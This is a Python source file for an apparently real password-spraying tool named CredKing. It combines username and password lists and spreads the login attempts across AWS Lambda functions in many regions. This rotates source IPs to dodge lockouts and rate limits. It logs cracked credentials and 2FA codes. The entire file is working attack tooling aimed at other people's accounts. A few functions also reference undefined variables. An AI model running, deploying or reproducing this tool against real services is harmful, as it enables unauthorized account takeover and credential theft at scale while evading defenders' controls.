#!/usr/bin/python3
from concurrent.futures import ThreadPoolExecutor
from zipfile import *
from operator import itemgetter
from threading import Lock, Thread
import json, sys, random, string, ntpath, time, os, datetime, queue, shutil
import boto3, argparse, importlib

credentials = { 'accounts':[] }
lambda_clients = {}
global_arns = {}
regions = [
	'us-east-2', 'us-east-1','us-west-1','us-west-2','eu-west-3',
	'ap-northeast-1','ap-northeast-2','ap-south-1',
	'ap-southeast-1','ap-southeast-2','ca-central-1',
	'eu-central-1','eu-west-1','eu-west-2','sa-east-1',
]

lock = Lock()
q = queue.Queue()

threads = []

start_time = None
end_time = None
time_lapse = None

def main(args,pargs):
	global start_time, end_time, time_lapse

	thread_count = args.threads
	plugin = args.plugin
	username_file = args.userfile
	password_file = args.passwordfile
	access_key = args.access_key
	secret_access_key = args.secret_access_key
	useragent_file = args.useragentfile

	pluginargs = {}
	for i in range(len(pargs)-1):
		key = pargs[i].replace("--","")
		pluginargs[key] = pargs[i+1]

	start_time = datetime.datetime.utcnow()
	log_entry(f'Execution started at: {start_time}')

	# Prepare credential combinations into the queue
	load_credentials(username_file, password_file, useragent_file)

	# Check with plugin to make sure it has the data that it needs
	validator = importlib.import_module(f'plugins.{plugin}')
	if getattr(validator,"validate",None) is not None:
		valid,errormsg = validator.validate(pluginargs)
		if not valid:
			log_entry(errormsg)
			return
	else:
		log_entry(f"No validate function found for plugin: {plugin}")

	# Prepare the deployment package
	zip_path = create_zip(plugin)

	# Create lambdas based on thread count
	arns = load_lambdas(access_key, secret_access_key, thread_count, zip_path)

	# Print stats
	display_stats()

	# Start Spray
	with ThreadPoolExecutor(max_workers=len(arns)) as executor:
		for arn in arns:
			log_entry(f'Launching spray using {arn}...')
			executor.submit(
				start_spray,
				access_key=access_key,
				secret_access_key=secret_access_key,
				arn=arn,
				args=pluginargs
			)


	# Capture duration
	end_time = datetime.datetime.utcnow()
	time_lapse = (end_time-start_time).total_seconds()

	# Remove AWS resources and build zips
	clean_up(access_key, secret_access_key, only_lambdas=True)

	# Print stats
	display_stats(False)


def display_stats(start=True):
	if start:
		lambda_count = sum(bool(val) for lc, val in lambda_clients.items())
		log_entry(f"User/Password Combinations: {len(credentials['accounts'])}")
		log_entry(f'Total Regions Available: {len(regions)}')
		log_entry(f'Total Lambdas: {lambda_count}')
				

	if end_time and not start:
		log_entry(f'End Time: {end_time}')
		log_entry(f'Total Execution: {time_lapse} seconds')


def start_spray(access_key, secret_access_key, arn, args):
	while True:
		item = q.get_nowait()

		if item is None:
			break

		payload = {
			'username': item['username'],
			'password': item['password'],
			'useragent': item['useragent'],
			'args': args,
		}

		invoke_lambda(
			access_key=access_key,
			secret_access_key=secret_access_key,
			arn=arn,
			payload=payload,
		)

		q.task_done()


def clear_credentials(username, password):
	global credentials
	c = {'accounts': []}
	for x in credentials['accounts']:
		if x['username'] != username:
			x['success'] = True
			c['accounts'].append(x)
	credentials = c


def load_credentials(user_file, password_file,useragent_file=None):
	log_entry(f'Loading credentials from {user_file} and {password_file}')

	users = load_file(user_file)
	passwords = load_file(password_file)
	if useragent_file is not None:
		useragents = load_file(useragent_file)
	else:
		useragents = ["Python CredKing (https://github.com/ustayready/CredKing)"]

	for user in users:
		for password in passwords:
			cred = {
				'username': user,
				'password': password,
				'useragent': random.choice(useragents),
			}

			credentials['accounts'].append(cred)

	for cred in credentials['accounts']:
		q.put(cred)


def load_file(filename):
	if filename:
		return [line.strip() for line in open(filename, 'r')]


def load_zips(thread_count):
	thread_count = min(thread_count, len(regions))
	use_regions = [regions[r] for r in range(thread_count)]
	with ThreadPoolExecutor(max_workers=thread_count) as executor:
		for region in use_regions:
			zip_list.add(
				executor.submit(
					create_zip,
					plugin=plugin,
					region=region,
				)
			)


def load_lambdas(access_key, secret_access_key, thread_count, zip_path):
	threads = thread_count

	threads = min(threads, len(regions))
	threads = min(threads, len(credentials['accounts']))
	arns = []
	with ThreadPoolExecutor(max_workers=threads) as executor:
		arns.extend(
			executor.submit(
				create_lambda,
				zip_path=zip_path,
				access_key=access_key,
				secret_access_key=secret_access_key,
				region_idx=x,
			)
			for x in range(threads)
		)

	return [x.result() for x in arns]


def generate_random():
	seed = random.getrandbits(32)
	while True:
	   yield seed
	   seed += 1


def create_zip(plugin):
	plugin_path = f'plugins/{plugin}/'
	random_name = next(generate_random())
	build_zip = f'build/{plugin}_{random_name}.zip'

	with lock:
		log_entry(f'Creating build deployment for plugin: {plugin}')
		shutil.make_archive(build_zip[:-4], 'zip', plugin_path)

	return build_zip


def sorted_arns():
	return sorted(
		global_arns.items(),
		key=itemgetter(1),
		reverse=False
	)


def next_arn():
	if len(global_arns.items()) > 0:
		return sorted_arns()[0][0]


def update_arns(region_name=None):
	dt = datetime.datetime.now()
	if not region_name:
		for k,v in global_arns.items():
			global_arns[k] = dt
	else:
		global_arns[region_name] = dt


def init_client(service_type, access_key, secret_access_key, region_name):
	ck_client = None

	# Reuse Lambda lambda_clients
	if service_type == 'lambda' and region_name in lambda_clients.keys():
		return lambda_clients[region_name]

	with lock:
		ck_client = boto3.client(
			service_type,
			aws_access_key_id=access_key,
			aws_secret_access_key=secret_access_key,
			region_name=region_name,
		)

	if service_type == 'lambda':
		lambda_clients[region_name] = ck_client

	return ck_client


def create_role(access_key, secret_access_key, region_name):
	client = init_client('iam', access_key, secret_access_key, region_name)
	lambda_policy = {
		"Version": "2012-10-17",
	  "Statement": [
		{
		  "Effect": "Allow",
		  "Principal": {
			"Service": "lambda.amazonaws.com"
		  },
		  "Action": "sts:AssumeRole"
		},
		{
		  "Effect": "Allow",
		  "Principal": {
			"Service": "sns.amazonaws.com"
		  },
		  "Action": "sts:AssumeRole"
		}
	  ]
	}

	current_roles = client.list_roles()
	check_roles = current_roles['Roles']
	for current_role in check_roles:
		arn = current_role['Arn']
		role_name = current_role['RoleName']

		if role_name == 'CredKing_Role':
			return arn

	role_response = client.create_role(RoleName='CredKing_Role',
		AssumeRolePolicyDocument=json.dumps(lambda_policy)
	)
	role = role_response['Role']
	return role['Arn']


def create_lambda(access_key, secret_access_key, zip_path, region_idx):
	region = regions[region_idx]
	head,tail = ntpath.split(zip_path)
	build_file = tail.split('.')[0]
	plugin_name = build_file.split('_')[0]

	handler_name = f'{plugin_name}.lambda_handler'
	zip_data = None

	with open(zip_path,'rb') as fh:
		zip_data = fh.read()

	try:
		role_name = create_role(access_key, secret_access_key, region)
		client = init_client('lambda', access_key, secret_access_key, region)
		response = client.create_function(
				Code={
					'ZipFile': zip_data,
				},
				Description='',
				FunctionName=build_file,
				Handler=handler_name,
				MemorySize=128,
				Publish=True,
				Role=role_name,
				Runtime='python3.6',
				Timeout=8,
				VpcConfig={
				},
			)

		log_entry(f"Created lambda {response['FunctionArn']} in {region}")

		return response['FunctionArn']

	except Exception as ex:
		log_entry(f'Error creating lambda using {zip_path} in {region}: {ex}')
		return None


def invoke_lambda(access_key, secret_access_key, arn, payload):
	lambdas = []
	arn_parts = arn.split(':')
	region, func = arn_parts[3], arn_parts[-1]
	client = init_client('lambda', access_key, secret_access_key, region)

	payload['region'] = region

	response = client.invoke(
		FunctionName   = func,
		InvocationType = "RequestResponse",
		Payload        = bytearray(json.dumps(payload), 'utf-8')
	)

	return_payload = json.loads(response['Payload'].read().decode("utf-8"))
	user, password = return_payload['username'], return_payload['password']
	code_2fa = return_payload['code']

	if return_payload['success'] == True:
		clear_credentials(user, password)

		log_entry(f'(SUCCESS) {user} / {password} -> Success! (2FA: {code_2fa})')
	else:
		log_entry(f'(FAILED) {user} / {password} -> Failed.')
		

def log_entry(entry):
	ts = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')
	print(f'[{ts}] {entry}')


def clean_up(access_key, secret_access_key, only_lambdas=True):
	if not only_lambdas:
		client = init_client('iam', access_key, secret_access_key)
		client.delete_role(RoleName='CredKing_Role')

	for client_name, client in lambda_clients.items():
		log_entry(f'Cleaning up lambdas in {client.meta.region_name}...')

		try:
			if lambdas_functions := client.list_functions(
				FunctionVersion='ALL', MaxItems=1000
			):
				for lambda_function in lambdas_functions['Functions']:
					if '$LATEST' not in lambda_function['FunctionArn']:
						lambda_name = lambda_function['FunctionName']
						arn = lambda_function['FunctionArn']
						try:
							log_entry(f'Destroying {arn} in region: {client.meta.region_name}')
							client.delete_function(FunctionName=lambda_name)
						except:
							log_entry(f'Failed to clean-up {arn} using client region {region}')
		except:
			log_entry(f'Failed to connect to client region {region}')

	filelist = [ f for f in os.listdir('build') if f.endswith(".zip") ]
	for f in filelist:
		os.remove(os.path.join('build', f))


if __name__ == '__main__':
	parser = argparse.ArgumentParser()
	parser.add_argument('--plugin', help='spraying plugin', required=True)
	parser.add_argument('--threads', help='thread count (default: 1)',
		type=int, default=1)
	parser.add_argument('--userfile', help='username file', required=True)
	parser.add_argument('--passwordfile', help='password file', required=True)
	parser.add_argument('--useragentfile', help='useragent file', required=False)
	parser.add_argument('--access_key', help='aws access key', required=True)
	parser.add_argument('--secret_access_key', help='aws secret access key', required=True)
	args,pluginargs = parser.parse_known_args()
	main(args,pluginargs)